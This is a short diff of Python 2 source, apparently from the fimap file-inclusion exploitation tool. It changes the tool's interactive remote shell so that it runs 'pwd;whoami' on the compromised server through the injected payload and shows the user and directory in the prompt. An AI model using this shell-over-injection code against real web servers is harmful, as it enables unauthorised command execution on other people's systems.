@@ -171,12 +171,18 @@ class codeinjector(baseClass):
                     if (attack == "fimap_shell"):
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
-                        pwd_cmd = item.generatePayload("pwd")
-                        curdir = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
+                        pwd_cmd = item.generatePayload("pwd;whoami")
+                        tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
+                        curdir = tmp.split("\n")[0].strip()
+                        curusr = tmp.split("\n")[1].strip()
+                        
+                        if (curusr) == "":
+                            curusr = "fimap"
+                        
                         print shell_banner
 
                         while 1==1:
-                            cmd = raw_input("fimap_shell:%s$> " %curdir)
+                            cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
                             if cmd == "q" or cmd == "quit": break
                             
                             if (cmd.strip() != ""):
